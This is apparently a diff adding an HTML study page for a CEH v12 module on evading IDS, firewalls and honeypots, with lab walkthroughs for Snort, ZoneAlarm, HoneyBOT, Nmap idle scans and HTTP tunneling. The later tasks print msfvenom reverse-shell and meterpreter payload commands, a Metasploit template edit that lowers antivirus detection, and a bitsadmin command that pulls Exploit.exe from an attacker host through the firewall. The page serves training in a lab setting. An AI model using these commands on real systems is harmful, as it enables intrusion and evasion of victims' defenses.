@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 12 - Evading IDS, Firewalls, and Honeypots</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav>
+        <h1>[MISSION_CONTROL]</h1>
+        <div class="search-wrap">
+            <input id="globalSearch" type="text" placeholder="Search modules...">
+            <div id="searchResults"></div>
+        </div>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">☰</button>
+    <ul id="navMenu">
+            <li><a href="index.html" id="nav-index">ROOT_ROADMAP</a></li>
+            <li><a href="module_02.html" id="nav-02">MOD_02_RECON</a></li>
+            <li><a href="module_03.html" id="nav-03">MOD_03_SCAN</a></li>
+            <li><a href="module_04.html" id="nav-04">MOD_04_ENUM</a></li>
+            <li><a href="module_05.html" id="nav-05">MOD_05_VULN</a></li>
+            <li><a href="module_06.html" id="nav-06">MOD_06_SYS</a></li>
+            <li><a href="module_07.html" id="nav-07">MOD_07_MAL</a></li>
+            <li><a href="module_08.html" id="nav-08">MOD_08_SNIFF</a></li>
+            <li><a href="module_09.html" id="nav-09">MOD_09_SE</a></li>
+            <li><a href="module_10.html" id="nav-10">MOD_10_DOS</a></li>
+            <li><a href="module_11.html" id="nav-11">MOD_11_SESS</a></li>
+            <li><a href="module_12.html" id="nav-12">MOD_12_EVADE</a></li>
+            <li><a href="cheat_sheet.html" id="nav-cheat">CHEAT_SHEET</a></li>
+        </ul>
+        <button id="themeToggle" class="theme-toggle">SWITCH_MODE</button>
+    </nav>
+    <main class="content-body">
+        <div class="window">
+            <div class="module-header">
+                <span>CEH v12 - Module 12</span>
+                <h2 class="hero-3d">Evading IDS, Firewalls, and Honeypots</h2>
+            </div>
+
+            <p>Organizations use firewalls, intrusion detection/prevention systems (IDS/IPS), and honeypots to protect their networks, which remain preferred targets for attackers. As an ethical hacker or penetration tester, you must understand the functions, placement, and design of IDS, IPS, firewalls, and honeypots, and how attackers evade them, in order to detect intrusion attempts and audit a network against IDS/firewall evasion.</p>
+
+            <p><strong>Scenario:</strong> The adoption of Internet use throughout the business world has boosted network usage in general. Organizations are using various network security measures such as firewalls, intrusion detection systems (IDS), intrusion prevention systems (IPS), and "honeypots" to protect their networks. Attackers continue to find new ways to breach network security and attack these targets. The labs in this module give hands-on experience in auditing a network against IDS and firewall evasion attacks.</p>
+
+            <p><strong>Objective:</strong> Evade the IDS and firewall, and perform other tasks that include, but are not limited to: detect intrusion attempts; detect malicious network traffic; detect intruders and their attack weapon; evade firewalls using various evasion techniques.</p>
+
+            <p><strong>Overview of Evading IDS, Firewalls, and Honeypots:</strong> IDSs provide an extra layer of security to an organization's infrastructure and are attractive targets for attackers. Attackers implement various IDS evasion techniques to bypass this security mechanism and compromise the infrastructure. Many IDS evasion techniques circumvent detection through multiple methods and can adapt to the best possible method for each system. A firewall operates on a predefined set of rules; using extensive knowledge and skill, an attacker can bypass the firewall by employing various bypassing techniques, tricking the firewall so it does not filter the generated malicious traffic.</p>
+
+            <p><strong>Lab Tasks:</strong></p>
+            <ul>
+                <li>Perform intrusion detection using various tools
+                    <ul>
+                        <li>Detect intrusions using Snort</li>
+                        <li>Detect malicious network traffic using ZoneAlarm FREE FIREWALL</li>
+                        <li>Detect malicious network traffic using HoneyBOT</li>
+                    </ul>
+                </li>
+                <li>Evade firewalls using various evasion techniques
+                    <ul>
+                        <li>Bypass Windows firewall using Nmap evasion techniques</li>
+                        <li>Bypass firewall rules using HTTP/FTP tunneling</li>
+                        <li>Bypass antivirus using Metasploit templates</li>
+                        <li>Bypass firewall through Windows BITSAdmin</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <section class="lab-task">
+                <h3>Lab 1: Perform Intrusion Detection using Various Tools - Task 1: Detect Intrusions using Snort</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Snort 2.9.15 / Windows Server 2019 / Windows 11 / Notepad++ / cmd / WinPcap</span>
+                    <p><strong>What/when:</strong> Snort is an open-source network intrusion detection system capable of real-time traffic analysis and packet logging on IP networks. It can perform protocol analysis and content searching/matching, and is used to detect a variety of attacks and probes such as buffer overflows, stealth port scans, CGI attacks, SMB probes, and OS fingerprinting attempts. It uses a flexible rules language to describe traffic to collect or pass, plus a detection engine with a modular plug-in architecture. Snort can act as a straight packet sniffer (like tcpdump), a packet logger (useful for network traffic debugging), or a network intrusion prevention system. Here Snort is installed on Windows Server 2019 (10.10.1.19) as an IDS: the snort.conf is configured (HOME_NET, RULE_PATH, dynamic libraries, preprocessors, output plugins, ipvar-&gt;var), an ICMP detection rule is enabled, and Snort runs in IDS mode. A ping from the attacker (Windows 11, 10.10.1.11) triggers an alarm and the event is logged to C:\Snort\log\10.10.1.11\ICMP_ECHO.ids. WinPcap drivers for packet capturing are already installed in this task environment.</p>
+                    <pre><code># IDS machine: Windows Server 2019
+# Install Snort from Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort
+# double-click Snort_2_9_15_Installer.exe (Run if Open File - Security Warning)
+# Accept License Agreement; select default options; click Close; click OK to exit installer
+# Snort installs to C:\Snort (C:\ or D:\ depending on OS drive)
+# WinPcap drivers already installed in this environment
+
+# Copy Snort rules snapshot into C:\Snort
+# copy ...\snortrules-snapshot-29150\etc\snort.conf -> C:\Snort\etc (replace existing)
+# copy ...\so_rules folder -> C:\Snort (replace)
+# copy ...\preproc_rules folder -> C:\Snort (replace)
+# copy ...\rules folder -> C:\Snort (replace)
+
+# Verify Snort and enable the Ethernet driver
+# Start -> Run -> cmd -> OK
+cd C:\Snort\bin
+snort
+# Snort initializes; after completion press Ctrl+C to return to C:\Snort\bin
+snort -W
+# lists physical address, IP address and Ethernet drivers (disabled by default)
+# note your Ethernet driver index number (here: 1)
+snort -dev -i 1
+# enables interface index 1; rapid scrolling text confirms capture
+# leave this Snort window open; open a second command prompt
+ping google.com
+# triggers a Snort alert (ICMP echo) in the first window; Google IP varies
+
+# Configure C:\Snort\etc\snort.conf in Notepad++
+# Step #1 network variables (line ~45): HOME_NET = 10.10.1.19 (Snort host IP)
+# EXTERNAL_NET any (unchanged); DNS_SERVERS = 8.8.8.8 if a DNS server exists
+# SMTP/HTTP/SQL/TELNET/SSH_SERVERS: leave default if no servers run
+# Step #2 RULE_PATH (lines ~104-110): replace ../rules -> C:\Snort\rules
+#   ../so_rules -> C:\Snort\so_rules ; ../preproc_rules -> C:\Snort\preproc_rules
+# Create C:\Snort\rules\white_list.rules and black_list.rules (empty text files)
+# Step #4 dynamic loaded libraries (lines ~238-250):
+#   dynamic preprocessor libs -> C:\Snort\lib\snort_dynamicpreprocessor
+#   base engine -> C:\Snort\lib\snort_dynamicengine\sf_engine.dll
+#   comment out the dynamic rules libraries line (add space after #)
+# Step #5 preprocessors (lines ~253-266): comment out all listed preprocessors
+# line 326: delete the 'lzma' keyword and a space
+# Step #6 output plugins (lines ~513-534): classification.config/reference.config
+#   -> C:\Snort\etc\classification.config and C:\Snort\etc\reference.config
+#   add: output alert_fast: alerts.ids
+# Find/Replace ipvar -> var (11 occurrences); Save (Ctrl+S); close Notepad++
+
+# Enable ICMP detection rule
+# C:\Snort\rules\icmp-info.rules line 21:
+# alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.1.19 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;)
+
+# Start Snort in IDS mode (X = interface index, here 1)
+cd C:\Snort\bin
+snort -i1 -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii
+# wait for "Commencing packet processing (pid=xxxx)"; leave running
+
+# Attacker machine: Windows 11
+# Open cmd; ping the Snort host
+ping 10.10.1.19 -t
+# 10.10.1.19 = Windows Server 2019 (Snort); IP may vary
+# Snort host: observe alarm triggered; press Ctrl+C to stop Snort
+# Inspect logs: C:\Snort\log\10.10.1.11\ICMP_ECHO.ids (folder = attacker IP)
+</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Click Windows Server 2019 to switch to the Windows Server 2019 machine; click Ctrl+Alt+Delete; Administrator is selected by default; click Pa$$w0rd to paste the password and press Enter. On the Networks screen click Yes. Navigate to the Snort installer folder on the Z: drive, double-click Snort_2_9_15_Installer.exe (click Run if the security warning appears), accept the license and install with default options, then click Close and OK. Snort installs to C:\Snort (WinPcap drivers are already installed). Copy snort.conf, so_rules, preproc_rules, and rules from the snapshot folder into C:\Snort, replacing existing files. Open an elevated command prompt, cd to C:\Snort\bin, run snort (then Ctrl+C), snort -W to list interfaces and note the Ethernet index, then snort -dev -i 1 to enable capture. Open a second command prompt and ping google.com to trigger a Snort alert. Configure snort.conf in Notepad++: set HOME_NET to 10.10.1.19, fix RULE_PATH and dynamic library paths, comment out preprocessors, remove 'lzma', set output plugins, and replace ipvar with var. Create empty white_list.rules and black_list.rules. Edit icmp-info.rules line 21 to alert on ICMP to 10.10.1.19. Start Snort with snort -i1 -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii and wait for "Commencing packet processing". Switch to Windows 11, open a command prompt and run ping 10.10.1.19 -t; switch back to Windows Server 2019 to observe the triggered alarm. Press Ctrl+C to stop Snort and inspect C:\Snort\log\10.10.1.11\ICMP_ECHO.ids. Close all windows.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Snort runs in IDS mode on the target. Revert/disable firewall changes are handled in later tasks.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Perform Intrusion Detection using Various Tools - Task 2: Detect Malicious Network Traffic using ZoneAlarm FREE FIREWALL</h3>
+                <div class="section-card">
+                    <span class="tool-tag">ZoneAlarm FREE FIREWALL / Google Chrome / Windows 11 / Windows Server 2019</span>
+                    <p><strong>What/when:</strong> ZoneAlarm FREE Firewall blocks attackers and intruders from accessing your system. It manages and monitors all incoming and outgoing traffic, shields the network from hackers, malware, and other online threats, monitors programs for suspicious behavior, prevents identity theft by guarding your data, erases tracks for private surfing, locks out attackers, blocks intrusions, and makes the PC invisible online. Here Windows 11 first browses www.moviescope.com (a local site hosted on Windows Server 2019) successfully, then ZoneAlarm is installed and configured to block www.moviescope.com by adding it as a Host/Site in the Blocked zone. Browsing the site afterward returns "Your Internet access is blocked." The rule is then removed, ZoneAlarm is uninstalled, and Windows Defender Firewall is turned off for all profiles.</p>
+                    <pre><code># Victim machine: Windows 11
+# Browse http://www.moviescope.com (allowed before firewall) -> close Chrome
+
+# Install ZoneAlarm
+# navigate to Z:\CEHv12 Module 12 ...\Firewalls\ZoneAlarm FREE FIREWALL
+# double-click zafwSetupWeb_158_189_19019.exe
+# UAC: Yes
+# check "By clicking here, you accept the terms of the Privacy Policy"; Custom Install
+# EULA: Agree >
+# Application Control Mode: AUTO-LEARN; Next >
+# Chrome extension wizard: Skip (or Add to Chrome)
+# wait for download/configure; Installation Successful -> FINISH
+# close the ZoneAlarm webpage that opens
+
+# Configure blocking rule
+# ZoneAlarm main window -> FIREWALL button
+# FIREWALL tab -> View Zones (Basic Firewall)
+# Add >> -> Host/Site
+# Zone: Blocked
+# Hostname: www.moviescope.com
+# Description: Block This Site
+# Lookup -> IP appears -> OK
+# newly added rule appears -> OK
+
+# Verify block
+# open browser -> browse www.moviescope.com -> "Your Internet access is blocked"
+
+# Revert and cleanup
+# Firewall Settings -> select new rule in View Zones -> Remove -> OK (Yes if Delete Confirmation)
+# close ZoneAlarm main window
+# Show hidden icons (lower right) -> right-click ZoneAlarm icon -> Exit (Yes if Shut down prompt)
+# Restart Windows 11; login Admin / Pa$$w0rd
+# Uninstall: Control Panel -> Programs -> Programs and Features
+#   select ZoneAlarm Free Firewall -> Uninstall; follow wizard; restart when prompted
+# Turn off Windows Defender Firewall:
+#   Windows Defender Firewall -> "Turn Windows Defender Firewall on or off"
+#   select "Turn off Windows Defender Firewall (not recommended)" for Domain/Private/Public -> OK
+#   Advanced settings -> Windows Defender Firewall Properties (Overview)
+#   Domain/Private/Public Profile: Firewall state = Off -> Apply -> OK
+# close all windows
+</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Click Windows 11 to switch to the victim machine and browse www.moviescope.com to confirm it is reachable before the firewall is configured. Install ZoneAlarm from the Z: drive using the wizard (accept terms, Custom Install, AUTO-LEARN mode, skip the Chrome extension, Finish). In the ZoneAlarm main window click FIREWALL, then View Zones under Basic Firewall, Add &gt;&gt; -&gt; Host/Site, set Zone to Blocked, Hostname to www.moviescope.com, Description "Block This Site", click Lookup so the IP appears, then OK. Browse www.moviescope.com again and observe "Your Internet access is blocked." Revert by selecting the new rule in View Zones, clicking Remove, then OK. Exit ZoneAlarm from the hidden icons, restart Windows 11 and log in as Admin. Uninstall ZoneAlarm via Control Panel -&gt; Programs and Features, restart when prompted, then turn off Windows Defender Firewall for Domain, Private, and Public profiles (including Advanced settings properties). Close all windows.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. ZoneAlarm is removed after the lab; Windows Defender Firewall is turned off for subsequent tasks.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 1: Perform Intrusion Detection using Various Tools - Task 3: Detect Malicious Network Traffic using HoneyBOT</h3>
+                <div class="section-card">
+                    <span class="tool-tag">HoneyBOT / Windows Server 2022 / Parrot Security (telnet) / Windows Server 2019</span>
+                    <p><strong>What/when:</strong> HoneyBOT is a medium-interaction honeypot for Windows. A honeypot creates a safe environment to capture and interact with unsolicited traffic on a network, and is ideal for network security research or as part of an early-warning IDS. Here HoneyBOT is installed and run as administrator on Windows Server 2022 (honeypot host). The attacker on Parrot Security opens a root shell and runs telnet to the Windows Server 2022 IP (10.10.1.22). On the honeypot host, expanding Ports and Remotes in HoneyBOT shows the ports and remote IPs that connected, and View Details opens the Packet Log with connection details (date/time, protocol, source IP/port, server port). The same can be observed with an ftp command from Parrot Security.</p>
+                    <pre><code># Honeypot host: Windows Server 2022
+# Login CEH\Administrator / Pa$$w0rd; Networks screen -> Yes
+# Install HoneyBOT from Z:\CEHv12 Module 12 ...\Honeypot Tools\HoneyBOT
+# double-click HoneyBOT_018.exe; UAC Yes; follow wizard
+# at "Completing the HoneyBot Setup Wizard": uncheck Launch HoneyBOT; Finish
+# Start -> Recently added -> HoneyBOT -> More -> Run as administrator
+# HoneyBOT configuration pop-up -> Yes
+# HoneyBOT Options:
+#   General: leave defaults
+#   Email Alert: optional (none in this task)
+#   Exports: Export Logs to CSV + Upload Logs to Server (selected)
+#   Updates: uncheck Check for Updates -> Apply -> OK (OK on Bindings pop-up)
+# leave HoneyBOT running
+
+# Attacker: Parrot Security
+sudo su
+# password: toor (not visible)
+cd
+telnet 10.10.1.22
+# 10.10.1.22 = Windows Server 2022 IP; may vary
+# prompted for telnet credentials of Windows Server 2022
+
+# Honeypot host: Windows Server 2022
+# HoneyBOT: expand Ports and Remotes (left pane)
+# Ports: port numbers from which the host received requests/attacks
+# Remotes: recorded source IP addresses
+# right-click any IP or Port -> View Details -> Packet Log
+# Connection Details: date/time, protocol, source IP, source port, server port
+# (optional) run ftp from Parrot Security and observe the log
+</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Click Windows Server 2022 to switch to the target machine and log in as CEH\Administrator. Install HoneyBOT from the Z: drive, unchecking Launch HoneyBOT at the end. Run HoneyBOT as administrator (Start -&gt; Recently added -&gt; HoneyBOT -&gt; More -&gt; Run as administrator) and click Yes to configure. In HoneyBOT Options leave General defaults, skip email alerts, select Export Logs to CSV and Upload Logs to Server on the Exports tab, uncheck Check for Updates on the Updates tab, then Apply and OK (OK on the Bindings pop-up). Leave HoneyBOT running. Click Parrot Security, log in as attacker/toor, open a MATE Terminal, run sudo su (password toor), cd, then telnet 10.10.1.22. Switch back to Windows Server 2022, expand Ports and Remotes in HoneyBOT, right-click any IP or Port and choose View Details to open the Packet Log and inspect connection details. Optionally run ftp from Parrot Security and observe the additional log. End the lab instance and re-launch before the next lab. Close all windows.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. HoneyBOT captures unsolicited traffic; an ftp probe can be used to generate additional log entries.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 2: Evade Firewalls using Various Evasion Techniques - Task 1: Bypass Windows Firewall using Nmap Evasion Techniques</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Nmap / Windows Defender Firewall / Windows 11 / Parrot Security / Windows Server 2022</span>
+                    <p><strong>What/when:</strong> A Windows Firewall inbound rule is created on Windows 11 to block all incoming traffic from the Parrot Security machine (10.10.1.13). Normal Nmap scans (nmap, nmap -sS, nmap -T4 -A) against 10.10.1.11 then show all 1,000 ports filtered. A ping sweep (nmap -sP 10.10.1.0/24) discovers live hosts, and a zombie/idle scan (nmap -sI 10.10.1.22 10.10.1.11) using Windows Server 2022 as the zombie reveals open ports and services despite the firewall blocking the attacker directly. Afterward the inbound rule is deleted and Windows Defender Firewall is turned off for all profiles.</p>
+                    <pre><code># Windows 11: enable firewall and block the attacker
+# Control Panel -> System and Security -> Windows Defender Firewall -> "Use recommended settings"
+# Advanced settings (left pane)
+# Inbound Rules (left pane) -> New Rule (Actions)
+# Rule Type: Custom -> Next
+# Program: default -> Next
+# Protocol and Ports: default -> Next
+# Scope: "These IP addresses" under remote IPs -> Add -> 10.10.1.13 (Parrot) -> OK -> Next
+# Action: Block the connection -> Next
+# Profile: default (all) -> Next
+# Name: Block Parrot Security -> Finish
+# close all windows
+
+# Parrot Security: scan through/around the firewall
+sudo su
+# password: toor (not visible)
+cd
+nmap 10.10.1.11
+# all 1,000 scanned ports filtered (firewall on)
+nmap -sS 10.10.1.11
+# TCP SYN scan; same filtered result
+nmap -T4 -A 10.10.1.11
+# -T4 aggressive timing; -A OS/version/script/traceroute; same result
+nmap -sP 10.10.1.0/24
+# ping sweep; discovers live machines (Windows Server 2019 10.10.1.19 active)
+nmap -sI 10.10.1.22 10.10.1.11
+# zombie/idle scan using 10.10.1.22 as zombie; reveals open ports/services
+# choose any live IP from the ping sweep as the zombie
+
+# Cleanup on Windows 11
+# Windows Defender Firewall with Advanced Security -> Inbound Rules
+# delete "Block Parrot Security"
+# turn off Windows Defender Firewall for all profiles
+# close all windows
+</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Click Windows 11 and turn on Windows Defender Firewall using recommended settings, then open Advanced settings and create a custom inbound rule that blocks all incoming traffic from the Parrot Security IP (10.10.1.13), naming it "Block Parrot Security". Close all windows and switch to Parrot Security. Open a MATE Terminal, run sudo su (password toor) and cd, then run nmap 10.10.1.11, nmap -sS 10.10.1.11, and nmap -T4 -A 10.10.1.11; all show 1,000 ports filtered. Run nmap -sP 10.10.1.0/24 to discover live hosts (Windows Server 2019 at 10.10.1.19), then run nmap -sI 10.10.1.22 10.10.1.11 to perform a zombie scan through Windows Server 2022, revealing open ports and services. Switch back to Windows 11, delete the inbound rule, turn off Windows Defender Firewall for all profiles, and close all windows.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Nmap zombie scan requires a suitable idle host. Use only in authorized labs.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 2: Evade Firewalls using Various Evasion Techniques - Task 2: Bypass Firewall Rules using HTTP/FTP Tunneling</h3>
+                <div class="section-card">
+                    <span class="tool-tag">HTTPort / HTTHost / Windows Defender Firewall / Windows Server 2019 / Windows Server 2022 / Windows 11 / ftp</span>
+                    <p><strong>What/when:</strong> HTTP tunneling encapsulates data inside HTTP traffic (port 80); many firewalls do not inspect the HTTP payload, so traffic can be tunneled over TCP port 80. HTTHost (running on Windows Server 2022, port 90, password "magic") acts as the remote tunnel endpoint, while HTTPort (on Windows Server 2019) configures a port mapping (local 21 -&gt; remote 10.10.1.11:21) and tunnels FTP through the firewall. An outbound rule "Port 21 Blocked" on Windows Server 2019 blocks direct FTP to Windows 11 (10.10.1.11), but ftp 127.0.0.1 through HTTPort succeeds and creates a "Test" directory in C:\FTP on Windows 11. IIS Admin Service and World Wide Web Publishing Service must be disabled on Windows Server 2022 before running HTTHost.</p>
+                    <pre><code># Endpoint host: Windows Server 2022 (HTTHost)
+# Ensure IIS Admin Service and World Wide Web Publishing Service are NOT running
+# Start -> Windows Administrative Tools -> Services
+# if World Wide Web Publishing Service is enabled: disable it (Startup type Disabled)
+# stop IIS Admin Service if running
+# navigate to Z:\CEHv12 Module 12 ...\HTTP Tunneling Tools\HTTHost
+# double-click htthost.exe (Run if security warning)
+# HTTHost wizard -> Options tab:
+#   Port: 90 (default); other settings default
+#   Personal password: magic
+#   check Revalidate DNS names and Log connections -> Apply
+# Application log: last line "Listener: listening at 0.0.0.0:90"
+# leave HTTHost running; do not turn off Windows Server 2022
+
+# Firewall host: Windows Server 2019 (outbound block + HTTPort)
+# Control Panel -> System and Security -> Windows Defender Firewall
+# Turn Windows Defender Firewall on or off -> Turn on for Private + Public -> OK
+# Advanced settings -> Outbound Rules -> New Rule...
+# Rule Type: Port -> Next
+# Remote ports: All remote ports -> Next
+# Action: Block the connection -> Next
+# Profile: Domain/Private/Public -> Next
+# Name: Port 21 Blocked -> Finish
+# right-click "Port 21 Blocked" -> Properties -> Protocols and Ports tab
+# Remote port: Specific Ports -> 21 -> Apply -> OK
+
+# Test direct FTP (blocked)
+# right-click rule -> Disable Rule
+# cmd: ftp 10.10.1.11   (connects; 10.10.1.11 = Windows 11 FTP host)
+# right-click rule -> Enable Rule
+# cmd: ftp 10.10.1.11   (connection blocked)
+
+# Install and configure HTTPort on Windows Server 2019
+# navigate to Z:\CEHv12 Module 12 ...\HTTP Tunneling Tools\HTTPort
+# double-click httport3snfm.exe; UAC Yes; follow install wizard
+# launch HTTPort (Httport3SNFM) from Start menu
+# Introduction wizard: Next x5 -> Close
+# Proxy tab:
+#   Host name or IP: 10.10.1.22 (HTTHost host) ; Port: 90
+#   Bypass mode: Remote host
+#   Use personal remote host at: 10.10.1.22 ; port 90
+#   Password: magic
+# Port mapping tab -> Add
+#   right-click "New mapping" -> Edit -> rename "ftp test"
+#   Local port -> Edit -> 21
+#   Remote host -> Edit -> 10.10.1.11
+#   Remote port -> Edit -> 21
+# Proxy tab -> Start (ignore errors if any)
+
+# Verify tunnel
+# cmd: ftp 10.10.1.11          (blocked by outbound rule)
+# cmd: ftp 127.0.0.1           (tunneled; connects via localhost)
+# login: Jason / qwerty
+# mkdir Test
+# Windows 11: verify "Test" folder in C:\FTP
+
+# Cleanup
+# delete outbound rule "Port 21 Blocked"
+# stop HTTHost and HTTPort
+# disable Windows Defender Firewall on Windows Server 2019
+# start World Wide Web Publishing Service and IIS Admin Service on Windows Server 2022
+</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> On Windows Server 2022, ensure IIS Admin Service and World Wide Web Publishing Service are disabled, then run HTTHost from the Z: drive, set Port to 90 and Personal password to "magic", check Revalidate DNS names and Log connections, click Apply, and confirm the Application log shows "Listener: listening at 0.0.0.0:90"; leave it running. On Windows Server 2019, turn on Windows Defender Firewall, create an outbound rule named "Port 21 Blocked" that blocks remote port 21, then test: disable the rule and run ftp 10.10.1.11 (connects), enable the rule and run ftp 10.10.1.11 (blocked). Install HTTPort, configure Proxy tab with host 10.10.1.22 port 90, Bypass mode Remote host, personal remote host 10.10.1.22:90, password magic; on Port mapping tab add a mapping renamed "ftp test" with local port 21, remote host 10.10.1.11, remote port 21; click Start. Run ftp 10.10.1.11 (still blocked) and ftp 127.0.0.1 (tunneled), log in as Jason/qwerty, and run mkdir Test. On Windows 11 verify the Test folder in C:\FTP. Clean up by deleting the outbound rule, stopping HTTHost and HTTPort, disabling the firewall on Windows Server 2019, and starting the WWW Publishing and IIS Admin services on Windows Server 2022. Close all windows.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. HTTP tunneling relies on port 80/90 being allowed; use only in authorized labs.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 2: Evade Firewalls using Various Evasion Techniques - Task 3: Bypass Antivirus using Metasploit Templates</h3>
+                <div class="section-card">
+                    <span class="tool-tag">Metasploit (msfvenom) / VirusTotal / pluma / i686-w64-mingw32-gcc / Parrot Security</span>
+                    <p><strong>What/when:</strong> Antivirus software detects malicious processes/files and prevents execution. Here a standard Metasploit payload (windows/shell_reverse_tcp) is generated with msfvenom as Windows.exe and uploaded to VirusTotal, where many vendors detect it (e.g. 54/70). The Metasploit PE template source (template.c) is then edited (payload size 4096 -&gt; 4000) and recompiled with mingw as evasion.exe. A new payload (bypass.exe) is generated using -x evasion.exe and re-uploaded to VirusTotal, where fewer vendors detect it (e.g. 48/71), demonstrating antivirus evasion by modifying Metasploit templates.</p>
+                    <pre><code># Attacker: Parrot Security
+sudo su
+# password: toor (not visible)
+# generate standard payload
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Windows.exe
+# 10.10.1.13 = Parrot Security IP; may vary
+
+# VirusTotal check (standard payload)
+# browser -> https://www.virustotal.com
+# Choose file -> /home/attacker/Windows.exe -> Open
+# Confirm upload -> wait for analysis
+# observe detection count (e.g. 54/70)
+
+# Modify and recompile Metasploit PE template
+pluma /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c
+# line 3: change payload size 4096 -> 4000; Save; close editor
+cd /usr/share/metasploit-framework/data/templates/src/pe/exe/
+i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe
+ls
+# confirm evasion.exe exists
+
+# Generate payload using modified template
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe
+
+# VirusTotal check (modified payload)
+# VirusTotal -> Upload file -> /home/attacker/bypass.exe -> Open
+# Confirm upload -> wait for analysis
+# observe reduced detection count (e.g. 48/71)
+# close all windows
+</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Click Parrot Security, log in as attacker/toor, open a MATE Terminal, run sudo su (password toor), and generate the standard payload with msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Windows.exe. Open Firefox, go to https://www.virustotal.com, upload Windows.exe from /home/attacker, confirm upload, and note the detection count (e.g. 54/70). Run pluma on template.c, change the payload size from 4096 to 4000 on line 3, save and close. cd to the exe template directory and compile with i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe, then ls to confirm. Generate bypass.exe with msfvenom using -x evasion.exe. Re-upload bypass.exe to VirusTotal and confirm the reduced detection count (e.g. 48/71). Close all windows.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; detection counts vary. Upload only test files in authorized environments.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Lab 2: Evade Firewalls using Various Evasion Techniques - Task 4: Bypass Firewall through Windows BITSAdmin</h3>
+                <div class="section-card">
+                    <span class="tool-tag">BITSAdmin / msfvenom / Apache / Windows Server 2019 / Parrot Security / Windows PowerShell</span>
+                    <p><strong>What/when:</strong> BITS (Background Intelligent Transfer Service) is a Windows component used to download/upload files over HTTP/SMB; BITSAdmin creates and monitors transfer jobs. Here Windows Defender Firewall is turned on on Windows Server 2019. The attacker on Parrot Security generates a meterpreter reverse_tcp payload (Exploit.exe), hosts it via Apache in /var/www/html/share, and the target downloads it through the firewall using bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe. The file appears in C:\ on Windows Server 2019, demonstrating firewall bypass via BITSAdmin.</p>
+                    <pre><code># Target: Windows Server 2019 (turn on firewall)
+# Control Panel -> System and Security -> Windows Defender Firewall
+# Turn Windows Defender Firewall on or off -> Turn on for Private + Public -> OK
+
+# Attacker: Parrot Security
+sudo su
+# password: toor (not visible)
+cd
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /home/attacker/Exploit.exe /var/www/html/share
+service apache2 start
+
+# Target: Windows Server 2019 (download through firewall)
+# Type here to search -> powershell -> Windows PowerShell
+bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
+# BITSAdmin transfers the file; verify in File Explorer -> C:\Exploit.exe
+# attacker can then use the file for access/privilege escalation
+# close all windows and document all acquired information
+</code></pre>
+                    <p><strong>Key procedural steps / narrative:</strong> Click Windows Server 2019, open Control Panel, turn on Windows Defender Firewall for Private and Public networks. Click Parrot Security, log in as attacker/toor, open a MATE Terminal, run sudo su (password toor), then generate the payload with msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe &gt; /home/attacker/Exploit.exe. Create and permission the shared directory with mkdir /var/www/html/share, chmod -R 755, chown -R www-data:www-data, copy Exploit.exe into it, and start Apache with service apache2 start. Switch to Windows Server 2019, launch Windows PowerShell, and run bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe. Open File Explorer, navigate to C:, and confirm Exploit.exe was transferred. Close all windows and document all acquired information.</p>
+                    <p><strong>Notes:</strong> Versions/website appearance may differ; process same. BITSAdmin traffic rides over HTTP and can traverse firewalls; use only in authorized labs.</p>
+                </div>
+            </section>
+
+        </div>
+    </main>
+    <script>
+        const body = document.body;
+    const applyTheme = (t) => {
+        if (t === 'dark') body.setAttribute('data-theme', 'dark');
+        else body.removeAttribute('data-theme');
+    };
+    function getTheme() {
+        try {
+            const p = new URLSearchParams(location.search);
+            const u = p.get('theme');
+            if (u === 'dark' || u === 'light') return u;
+        } catch (e) {}
